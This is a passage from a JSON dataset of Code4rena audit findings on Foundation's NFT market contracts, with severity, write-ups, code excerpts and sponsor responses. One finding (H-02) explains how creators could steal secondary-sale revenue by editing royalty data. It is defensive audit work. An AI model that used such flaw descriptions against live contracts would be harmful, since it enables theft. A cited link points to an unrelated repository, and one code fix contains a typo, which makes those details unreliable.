`authorizeSeller`. As the call travels through each mixin, we change `authorizeSeller` to `address(0)` once an escrow manager is able to confirm ownership. Finally when the call reaches `NFTMarketCore` it requires that `authorizeSeller` is `address(0)` before executing the transfer -- this confirms that one or more escrow managers (buy now or auctions) have positively confirmed the seller. So NFTs in the Market without being escrowed now reverts on this line.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the FNDNFTMarket contract. The bug allows a malicious user to obtain any NFT that is in escrow without a buyPrice or auction being initialized. This can happen if a NFT is mistakenly sent to the contract. The severity of this bug is medium as it only affects NFTs that were thought to be effectively burned and can be recovered. The recommended mitigation steps include adding additional checks to control who can obtain unallocated NFTs from the contract and having the protocol controlled entity handle such cases manually. The bug has been fixed by changing the `_transferFromEscrow` function in the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/51",
      "tags": [],
      "finders": []
    },
    {
      "id": "42492",
      "title": "[M-11] `MAX_ROYALTY_RECIPIENTS_INDEX` set too low",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\n[NFTMarketFees.sol#L78](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L78)<br>\n\nThe creator payouts are capped at `MAX_ROYALTY_RECIPIENTS_INDEX`. It's currently set to `4` and only 5 creators are paid out.<br>\nOther creators are ignored.\n\n### Recommended Mitigation Steps\n\nI don't think cases with more than 5 creators / royalty receivers are unlikely.<br>\nIt can and should probably be increased, especially as the transfers are already gas restricted.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/45#issuecomment-1057382530):**\n > Yes this is a fair point. The limit we put in place is arbitrary. We want some limit in order to ensure that the gas costs (which are often pushed to users other than the original creator) never get to be very expensive.\n> \n> What we can and should do is document this limitation so that it's more clear what exactly will happen when too many recipients are defined. Additionally we should comment on a possible workaround: If you have a contract that splits with too many participants you could use the Royalty Override in order to define a single contract recipient instead to handle the splits - e.g. https://www.0xsplits.xyz/\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a limitation in the NFTMarketFees.sol code, which is used for paying creators of NFTs. Currently, the code is set to only pay out to a maximum of 5 creators, even if there are more than 5 involved. This means that any additional creators will not receive any payment. The person who submitted the report suggests increasing this limit, as it is possible for there to be more than 5 creators involved in the creation of an NFT. The person who manages the code has acknowledged this issue and suggests documenting the limitation and providing a workaround for users who may encounter this problem. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/45",
      "tags": [],
      "finders": []
    },
    {
      "id": "42491",
      "title": "[M-10] `LockedBalance` library should drop parameters to 96/32 bits",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\n[LockedBalance.sol#L56](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/libraries/LockedBalance.sol#L56)<br>\n\nThe `LockedBalance` contract takes 256-bit amount values but performs bit math on them as if they were 96 bit values.\nBits could spill over to a different locked balance in the `else` part (`lockedBalance` stores **two** 128-bit locked balances in one 256-bit storage field):\n\n```solidity\nfunction set(\n  Lockups storage lockups,\n  uint256 index,\n  uint256 expiration,\n  uint256 totalAmount\n) internal {\n  unchecked {\n    // @audit-issue should drop totalAmount to 96, expiration to 128-96=32\n    uint256 lockedBalanceBits = totalAmount | (expiration << 96);\n    if (index % 2 == 0) {\n      // set first 128 bits.\n      index /= 2;\n      // @audit-info clears upper bits, then sets them\n      lockups.lockups[index] = (lockups.lockups[index] & last128BitsMask) | (lockedBalanceBits << 128);\n    } else {\n      // set last 128 bits.\n      index /= 2;\n      // @audit-info clears lower bits, then sets them\n      // @audit-issue sets entire 256-bit lockedBalanceBits instead of just 128-bit\n      lockups.lockups[index] = (lockups.lockups[index] & first128BitsMask) | lockedBalanceBits;\n    }\n  }\n}\n```\n\nIt could then increase the other, unrelated locked balance's amount leading to stealing funds from the protocol.\nAll callers of this function currently seem to ensure that `totalAmount` is indeed less than 96 bits but the `LockedBalance` library should be self-contained and not depend on the calling side to perform all checks.<br>\n\nIf the code is ever extended and more calls to these functions are performed, it'll likely cause issues.\n\n> The same issue happens in `setTotalAmount`\n\n### Recommended Mitigation Steps\n\nMake sure that there are only 96/32 bits set in `totalAmount` and `expiration` by dropping them to their respective types.\n\n```diff\nfunction set(\n  Lockups storage lockups,\n  uint256 index,\n  uint256 expiration,\n  uint256 totalAmount\n) internal {\n  unchecked {\n-    uint256 lockedBalanceBits = totalAmount | (expiration << 96);\n+    // cast it to uint256 again for the << 96 to work on 256-bits\n+    uint256 lockedBalanceBits = uint256(uint96(totalAmount)) | (uint256(uint32(expiration)) << 96);\n    \n    ...\n  }\n}\n```\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/44#issuecomment-1060632719):**\n > This is a good concern to flag. With this release we use a lot of slot packing strategies to try and save gas. We considered this suggestion, as well as potentially using the safe cast helpers from the OpenZeppelin library. For the moment at least, we decided not to make any changes here. We believe the assumptions behind these values are sound, and although it's mathematically possible for the assumptions to be violated, we don't believe it'll occur in production.\n> \n> For `totalAmount` for example, that value is always bound by the amount of ETH a user has sent to the FETH contract. Here are some notes we have written up about the size assumptions in our codebase:\n> \n> - ETH: uint96\n>   - Circulating supply is currently 119,440,269 ETH (119440269000000000000000000 wei / 1.2 \\* 10^26).\n>   - Max uint96 is 7.9 \\* 10^28.\n>   - Therefore any value capped by msg.value should never overflow uint96 assuming ETH total supply remains under 70,000,000,000 ETH.\n>     - There is currently ~2% inflation in ETH total supply (which fluctuates) and this value is expected to do down. We expect Ether will become deflationary before the supply reaches more than 500x current values.\n>   - 96 bits packs perfectly into a single slot with an address.\n> - Dates: uint32\n>   - Current date in seconds is 1643973923 (1.6 \\* 10^9).\n>   - Max uint32 is 4 \\* 10^9.\n>   - Dates will not overflow uint32 until 2104.\n>   - To ensure we don't behave unexpectedly in the future, we should require dates are <= max uint32.\n>   - uint40 would allow enough space for any date, but it's an awkward size to pack with.\n> - Sequence ID indexes: uint32\n>   - Our max sequence ID today is 149,819 auctions.\n>   - Max uint32 is 4 \\* 10^9.\n>   - Indexes will not overflow uint32 until we see >28,000x growth. This is the equiv to ~300 per block for every block in Ethereum to date.\n\n\n\n***\n\n",
      "summary": "\nThis bug report highlights an issue with the `LockedBalance` contract, which is used to store locked balances for a protocol. The contract currently takes 256-bit amount values but performs bit math on them as if they were 96 bit values. This can cause bits to spill over to a different locked balance, leading to potential theft of funds from the protocol. While the current callers of this function ensure that the values are within the correct range, it is important for the `LockedBalance` library to be self-contained and not rely on external checks. The report recommends mitigating this issue by ensuring that only 96/32 bits are set in the `totalAmount` and `expiration` variables. However, the team has acknowledged the concern and has decided not to make any changes at this time, citing sound assumptions behind the values. They have also provided information on the size assumptions used in their codebase to support their decision.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "42490",
      "title": "[M-09] Missing receiver validation in `withdrawFrom`",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\n[FETH.sol#L433](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FETH.sol#L433)<br>\n\nThe `FETH.withdrawFrom` function does not validate its `to` parameter.<br>\nFunds can be lost if `to` is the zero address.\n\n> Similar issues have been judged as medium recently, see [Sandclock M-15](https://code4rena.com/reports/2022-01-sandclock/) / [Github issue](https://github.com/code-423n4/2022-01-sandclock-findings/issues/183#issuecomment-1024626171).\n\n### Recommended Mitigation Steps\n\nCheck that `to != 0`.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/42#issuecomment-1057368552):**\n > Yes, this is a good recommendation which may prevent users losing their funds due to user error. We have made the following change as recommended:\n> \n> ```solidity\n>  } else if (to == address(0)) {\n>       revert FETH_Cannot_Withdraw_To_Address_Zero();\n>     } else if (to == address(this)) {\n>       revert FETH_Cannot_Withdraw_To_FETH();\n>     }\n> ```\n\n\n\n***\n\n",
      "summary": "\nThe `FETH.withdrawFrom` function in the `FETH.sol` contract has a bug where it does not check the `to` parameter before withdrawing funds. This means that if the `to` parameter is set to the zero address, funds can be lost. This has been identified as a medium severity issue and a similar problem was recently reported in another project. The recommended solution is to add a check that `to` is not the zero address before executing the withdrawal. The project team has confirmed this issue and made the suggested change to prevent users from losing their funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/42",
      "tags": [],
      "finders": []
    },
    {
      "id": "42489",
      "title": "[M-07] `_getCreatorPaymentInfo()` is Not Equipped to Handle Reverts on an Unbounded `_recipients` Array",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n[NFTMarketCreators.sol#L49-L251](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCreators.sol#L49-L251)<br>\n\nThe `_getCreatorPaymentInfo()` function is utilised by `_distributeFunds()` whenever an NFT sale is made. The function uses `try` and `catch` statements to handle bad API endpoints. As such, a revert in this function would lead to NFTs that are locked in the contract. Some API endpoints receive an array of recipient addresses which are iterated over. If for whatever reason the function reverts inside of a `try` statement, the revert is actually not handled and it will not fall through to the empty `catch` statement.\n\n### Proof of Concept\n\nThe end result is that valid and honest NFT contracts may revert if the call runs out of gas due to an unbounded `_recipients` array. `try` statements are only able to handle external calls.\n\n### Recommended Mitigation Steps\n\nConsider bounding the number of iterations to `MAX_ROYALTY_RECIPIENTS_INDEX` as this is already enforced by `_distributeFunds()`. It may be useful to identify other areas where the `try` statement will not handle reverts on internal calls.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/85#issuecomment-1062826549):**\n > Yes - this code is trying to be very defensive so that NFTs cannot get stuck in escrow. This is a great suggestion on how we could continue to improve.\n> \n> Instead of capping the loop lengths in `_getCreatorPaymentInfo` we have opted to remove them entirely. There was another simplification that happened recently to this function that made removal a viable option. Now the only other loop for this data is in _distributeFunds and we already cap the max length there.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `_getCreatorPaymentInfo()` function in the NFTMarketCreators.sol contract. This function is used to handle payments for NFT sales, but it currently has a problem where a revert in the function can cause NFTs to become locked in the contract. This is because the function uses `try` and `catch` statements to handle bad API endpoints, but if the function reverts inside the `try` statement, it will not be caught by the `catch` statement. The report recommends bounding the number of iterations in the function to prevent this issue. The report has been confirmed and commented on by a member of the Foundation team, who suggests removing the loop entirely to simplify the code. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/85",
      "tags": [],
      "finders": []
    },
    {
      "id": "42488",
      "title": "[M-06] `buyFromPrivateSaleFor()` Will Fail if The Buyer Has Insufficient Balance Due to an Open Offer on The Same NFT",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n[NFTMarketPrivateSale.sol#L143-L150](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L143-L150)<br>\n\nThe `buyFromPrivateSaleFor()` function allows sellers to make private sales to users. If insufficient `ETH` is provided to the function call, the protocol will attempt to withdraw the amount difference from the user's unlocked balance. However, if the same user has an open offer on the same NFT, then these funds will remain locked until expiration. As a result, the user cannot make use of these locked funds even though they may be needed for a successful sale.\n\n### Recommended Mitigation Steps\n\nConsider adding a `_cancelBuyersOffer()` call to the `buyFromPrivateSaleFor()` function. This should be added only to the case where insufficient `ETH` was provided to the trade. By cancelling the buyer's offer on the same NFT, we can guarantee that the user has access to the correct amount of funds.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/77#issuecomment-1058017830):**\n > Yes - completely agree. This was an oversight on our end - and as a result it created an inconsistent experience for users. Since we leveraged an outstanding offer balance for a `buy` purchase, the same behavior should occur when using Private Sales so that user's are not in a state where they cannot make the purchase due to incorrectly having their funds locked up.\n> \n> As you point out without this change, it's possible that the buyer using private sales continues to have their funds locked up for an Offer that can now only be accepted by themselves. It's an awkward state that should be avoided.\n> \n> We have made the recommended change.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a function called `buyFromPrivateSaleFor()` which allows sellers to make private sales of NFTs to users. The problem is that if the user does not provide enough `ETH` for the purchase, the protocol will try to withdraw the remaining amount from their unlocked balance. However, if the user also has an open offer on the same NFT, the funds will remain locked until the offer expires. This means that the user cannot use these funds for the purchase, even though they may be needed. \n\nThe recommended solution is to add a call to cancel the buyer's offer in the `buyFromPrivateSaleFor()` function if there is not enough `ETH` provided. This will ensure that the user has access to the correct amount of funds for the purchase. The team has confirmed this issue and has made the necessary changes to fix it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/77",
      "tags": [],
      "finders": []
    },
    {
      "id": "42487",
      "title": "[M-04] `adminAccountMigration()` Does Not Update `buyPrice.seller`",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood, also found by cccz_\n\n[NFTMarketReserveAuction.sol#L263-L292](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L263-L292)<br>\n[NFTMarketBuyPrice.sol#L125-L141](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L125-L141)<br>\n\nThe `adminAccountMigration()` function is called by the operator role to update all sellers' auctions. The `auction.seller` account is updated to the new address, however, the protocol fails to update `buyPrice.seller`. As a result, the protocol is put in a deadlock situation where the new address cannot cancel the auction and withdraw their NFT without the compromised account first cancelling the buy price and vice-versa. This is only recoverable if the new account is migrated back to the compromised account and then `cancelBuyPrice()` is called before migrating back.\n\n### Recommended Mitigation Steps\n\nConsider invalidating the buy offer before account migration.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/87#issuecomment-1060628220):**\n > Correct - if we were to use `adminAccountMigration` while the NFT had both an auction reserve price and had a buy price set this would have created a deadlock type situation where the NFT is in a bad state and we'd likely need to migrate the NFT back to the original owner in order to correct it.\n> \n> There were two possible solutions to this:\n>  - Update `adminAccountMigration` to update both auction and buy price at the same time.\n>  - Cut `adminAccountMigration` completely.\n> \n> We went with the latter solution. This is not a feature we have used in some time and as we continue to grow, it's not scalable since it required Foundation to get involved directly and included manual verification steps.\n> \n> Removing this feature has saved over 2KB in contract space as well, which we really needed in order to make room for new features and changes.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the `adminAccountMigration()` function in the NFTMarketReserveAuction and NFTMarketBuyPrice contracts. This function is used by the operator role to update all sellers' auctions. However, when the `auction.seller` account is updated to a new address, the protocol fails to update the `buyPrice.seller` account. This creates a deadlock situation where the new address cannot cancel the auction and withdraw their NFT without the compromised account first cancelling the buy price and vice-versa. To fix this, the recommended mitigation step is to consider invalidating the buy offer before account migration. The Foundation team has confirmed and commented on this issue, stating that they have decided to remove the `adminAccountMigration()` function altogether due to scalability and contract space concerns. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/87",
      "tags": [],
      "finders": []
    },
    {
      "id": "42486",
      "title": "[M-02] `SendValueWithFallbackWithdraw`: `withdrawFor` function may fail to withdraw ether recorded in `pendingWithdrawals`",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz_\n\nThe NFTMarketFees contract and the NFTMarketReserveAuction contract use the \\_sendValueWithFallbackWithdraw function to send ether to FoundationTreasury, CreatorRecipients, Seller, Bidder.\nWhen the receiver fails to receive due to some reasons (exceeding the gas limit or the receiver contract cannot receive ether), it will record the ether to be sent in the pendingWithdrawals variable.\n\n      function _sendValueWithFallbackWithdraw(\n        address payable user,\n        uint256 amount,\n        uint256 gasLimit\n      ) internal {\n        if (amount == 0) {\n          return;\n        }\n        // Cap the gas to prevent consuming all available gas to block a tx from completing successfully\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, ) = user.call{ value: amount, gas: gasLimit }(\"\");\n        if (!success) {\n          // Record failed sends for a withdrawal later\n          // Transfers could fail if sent to a multisig with non-trivial receiver logic\n          unchecked {\n            pendingWithdrawals[user] += amount;\n          }\n          emit WithdrawPending(user, amount);\n        }\n      }\n\nThe user can then withdraw ether via the withdraw or withdrawFor functions.\n\n      function withdraw() external {\n        withdrawFor(payable(msg.sender));\n      }\n      function withdrawFor(address payable user) public nonReentrant {\n        uint256 amount = pendingWithdrawals[user];\n        if (amount == 0) {\n          revert SendValueWithFallbackWithdraw_No_Funds_Available();\n        }\n        pendingWithdrawals[user] = 0;\n        user.sendValue(amount);\n        emit Withdrawal(user, amount);\n      }\n\nHowever, the withdrawFor function can only send ether to the address recorded in pendingWithdrawals. When the recipient is a contract that cannot receive ether, these ethers will be locked in the contract and cannot be withdrawn.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/SendValueWithFallbackWithdraw.sol#L37-L77>\n\n### Recommended Mitigation Steps\n\nAdd the withdrawTo function as follows:\n\n      function withdrawTo(address payable to) public nonReentrant {\n        uint256 amount = pendingWithdrawals[msg.sneder];\n        if (amount == 0) {\n          revert SendValueWithFallbackWithdraw_No_Funds_Available();\n        }\n        pendingWithdrawals[msg.sneder] = 0;\n        to.sendValue(amount);\n        emit Withdrawal(msg.sneder, amount);\n      }\n\n**[NickCuso (Foundation) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/12#issuecomment-1051183216):**\n > We believe this is better classified as a `2 (Med Risk)`.\n>  - Worst case is funds for a user are trapped in escrow, however they are correctly attributed to that user and cannot be accessed by any other account. If we did not address this by launch, the issue could be corrected post launch via a contract upgrade and that user would then be made whole. So the funds are just temporarily unavailable to them.\n> \n> This is a great report and we will be making a change to address the problem!\n> \n> When reviewing the recommended mitigation we identified a new potential risk that could introduce. So we are going a slightly different way...\n> \n> The `_sendValueWithFallbackWithdraw` function will send `FETH` tokens when it fails to transfer ETH. For any account that currently has a non-zero `pendingWithdrawals` we will include a migration function allowing us to move the escrowed ETH out of the market contract and into that user's FETH account. \n> \n> Once that migration has been completed, we will delete the migration function and withdraw* functions -- simplifying the market contract and freeing up much needed contract size to make room for new features in the future.\n\n**[Alberto Cuesta Caada (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/12#issuecomment-1072299920):**\n > The combination of upgradability with the limited scope of the vulnerability makes it reasonable to downgrade this to a medium severity.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem in two contracts, NFTMarketFees and NFTMarketReserveAuction, where ether is being sent to different recipients using a function called \\_sendValueWithFallbackWithdraw. However, if the recipient fails to receive the ether for some reason, it gets recorded in a variable called pendingWithdrawals. The issue is that the withdrawFor function can only send ether to the address recorded in pendingWithdrawals, which can cause the ether to be locked in the contract if the recipient is a contract that cannot receive ether. The report suggests adding a new function called withdrawTo to address this issue, but the Foundation team has decided to handle it differently by using a migration function to move the escrowed ETH into the user's FETH account. The severity of the bug has been downgraded to Medium as it can be fixed post-launch. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/12",
      "tags": [],
      "finders": []
    },
    {
      "id": "42485",
      "title": "[H-02] Creators can steal sale revenue from owners' sales",
      "impact": "HIGH",
      "content": "_Submitted by IllIllI_\n\n[NFTMarketCreators.sol#L158-L160](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L158-L160)<br>\n[NFTMarketCreators.sol#L196-L198](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L196-L198)<br>\n[NFTMarketCreators.sol#L97-L99](https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L97-L99)<br>\n\nAccording to the [`README.md`](<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/README.md?plain=1#L21>):\n\n> All sales in the Foundation market will pay the creator 10% royalties on secondary sales. This is not specific to NFTs minted on Foundation, it should work for any NFT. If royalty information was not defined when the NFT was originally deployed, it may be added using the Royalty Registry which will be respected by our market contract.\n\nUsing the Royalty Registry an owner can decide to change the royalty information right before the sale is complete, affecting who gets what.\n\n### Impact\n\nBy updating the registry to include the seller as one of the royalty recipients, the creator can steal the sale price minus fees. This is because if code finds that the seller is a royalty recipient the royalties are all passed to the creator regardless of whether the owner is the seller or not.\n\n### Proof of Concept\n\n```solidity\n          // 4th priority: getRoyalties override\n          if (recipients.length == 0 && nftContract.supportsERC165Interface(type(IGetRoyalties).interfaceId)) {\n            try IGetRoyalties(nftContract).getRoyalties{ gas: READ_ONLY_GAS_LIMIT }(tokenId) returns (\n              address payable[] memory _recipients,\n              uint256[] memory recipientBasisPoints\n            ) {\n              if (_recipients.length > 0 && _recipients.length == recipientBasisPoints.length) {\n                bool hasRecipient;\n                for (uint256 i = 0; i < _recipients.length; ++i) {\n                  if (_recipients[i] != address(0)) {\n                    hasRecipient = true;\n                    if (_recipients[i] == seller) {\n                      return (_recipients, recipientBasisPoints, true);\n```\n\n<https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L127-L154>\n\nWhen `true` is returned as the final return value above, the following code leaves `ownerRev` as zero because `isCreator` is `true`.\n\n```solidity\n      uint256 ownerRev\n    )\n  {\n    bool isCreator;\n    (creatorRecipients, creatorShares, isCreator) = _getCreatorPaymentInfo(nftContract, tokenId, seller);\n\n    // Calculate the Foundation fee\n    uint256 fee;\n    if (isCreator && !_nftContractToTokenIdToFirstSaleCompleted[nftContract][tokenId]) {\n      fee = PRIMARY_FOUNDATION_FEE_BASIS_POINTS;\n    } else {\n      fee = SECONDARY_FOUNDATION_FEE_BASIS_POINTS;\n    }\n\n    foundationFee = (price * fee) / BASIS_POINTS;\n\n    if (creatorRecipients.length > 0) {\n      if (isCreator) {\n        // When sold by the creator, all revenue is split if applicable.\n        creatorRev = price - foundationFee;\n      } else {\n        // Rounding favors the owner first, then creator, and foundation last.\n        creatorRev = (price * CREATOR_ROYALTY_BASIS_POINTS) / BASIS_POINTS;\n        ownerRevTo = seller;\n        ownerRev = price - foundationFee - creatorRev;\n      }\n    } else {\n      // No royalty recipients found.\n      ownerRevTo = seller;\n      ownerRev = price - foundationFee;\n    }\n  }\n```\n\nIn addition, if the index of the seller in `_recipients` is greater than `MAX_ROYALTY_RECIPIENTS_INDEX`, then the seller is omitted from the calculation and gets zero (`_sendValueWithFallbackWithdraw()` doesn't complain when it sends zero).\n\n```solidity\n        uint256 maxCreatorIndex = creatorRecipients.length - 1;\n        if (maxCreatorIndex > MAX_ROYALTY_RECIPIENTS_INDEX) {\n          maxCreatorIndex = MAX_ROYALTY_RECIPIENTS_INDEX;\n        }\n```\n\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L76-L79>\n\nThis issue does a lot of damage because the creator can choose whether and when to apply it on a sale-by-sale basis. Two other similar, but separate, exploits are available for the other blocks in `_getCreatorPaymentInfo()` that return arrays but they either require a malicious NFT implementation or can only specify a static seller for which this will affect things. In all cases, not only may the seller get zero dollars for the sale, but they'll potentially owe a lot of taxes based on the 'sale' price. The attacker may or may not be the creator - creators can be bribed with kickbacks.\n\n### Recommended Mitigation Steps\n\nAlways calculate owner/seller revenue separately from royalty revenue.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/30#issuecomment-1060623733):**\n > This is a great discovery and a creative way for creators to abuse the system, stealing funds from a secondary sale. Thank you for reporting this.\n> \n> It's a difficult one for us to address. We want to ensure that NFTs minted on our platform as a split continue to split revenue from the initial sale. We were using `isCreator` from `_getCreatorPaymentInfo` as our way of determining if all the revenue from a sale should go to the royalty recipients, which is a split contract for the use case we are concerned about here.\n> \n> The royalty override makes it easy for a creator to choose to abuse this feature at any time. So that was our primary focus for this fix.\n> \n> This is the change we have made in `_getFees`:\n> \n> ```solidity\n>     bool isCreator = false;\n>     // lookup for tokenCreator\n>     try ITokenCreator(nftContract).tokenCreator{ gas: READ_ONLY_GAS_LIMIT }(tokenId) returns (\n>       address payable _creator\n>     ) {\n>       isCreator = _creator == seller;\n>     } catch // solhint-disable-next-line no-empty-blocks\n>     {\n>       // Fall through\n>     }\n> \n>     (creatorRecipients, creatorShares) = _getCreatorPaymentInfo(nftContract, tokenId);\n> ```\n> \n> Since the royalty override is only considered in `_getCreatorPaymentInfo` we are no longer vulnerable to someone adding logic after the NFT has been released to try and rug pull the current owner(s).\n> \n> It is still possible for someone to try and abuse this logic, but to do so they must have built into the NFT contract itself a way to lie about who the `tokenCreator` is before the time of a sale. If we were to detect this happening, we would moderate that collection from the Foundation website. Additionally we will think about a longer term solution here so that this type of attack is strictly not possible with our market contract.\n\n\n\n***\n\n",
      "summary": "\nThis bug report highlights a vulnerability in the NFTMarketCreators contract that allows creators to steal the sale price of an NFT minus fees. This can be done by manipulating the royalty information in the Royalty Registry before a sale is completed. The code in the contract allows for this by passing all royalties to the creator if the seller is listed as a royalty recipient. This can result in the seller receiving zero dollars for the sale and potentially owing taxes on the sale price. The report suggests calculating owner/seller revenue separately from royalty revenue as a mitigation step. The Foundation team has confirmed and commented on the issue, stating that they have made changes to prevent this vulnerability from being exploited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "4236",
      "title": "[L-01] Unhandled ",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-unhandled-marketlockupfor-edge-case\" style=\"position:relative;\"><a href=\"#l-01-unhandled-marketlockupfor-edge-case\" aria-label=\"l 01 unhandled marketlockupfor edge case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Unhandled <code>marketLockupFor()</code> Edge Case</h2>\n<p><code>marketLockupFor()</code> will revert if too much <code>ETH</code> is provided. This can be modified to refund any surplus <code>ETH</code> to the users <code>FETH</code> balance.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "#l-01-unhandled-marketlockupfor-edge-case",
      "tags": [],
      "finders": []
    },
    {
      "id": "1596",
      "title": "[M-18] Fees Are Incorrectly Charged on Unfinalized NFT Sales",
      "impact": "MEDIUM",
